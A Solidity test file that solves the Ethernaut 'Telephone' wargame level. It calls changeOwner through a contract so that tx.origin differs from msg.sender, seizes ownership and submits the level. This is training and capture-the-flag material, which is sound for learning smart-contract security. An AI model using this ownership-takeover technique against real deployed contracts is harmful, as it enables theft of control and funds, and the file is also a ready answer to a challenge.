// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level4 {
    function changeOwner(address _owner) external;
}

contract Level4Test is EthernautTest {
    function testLevel4() public {
        _createLevel("4");
        Level4 levelInstance4 = Level4(levelInstance["4"]);

        // tx.origin is not the same as msg.sender from a contract
        levelInstance4.changeOwner(address(this));

        require(_submitLevel("4"));
    }
}
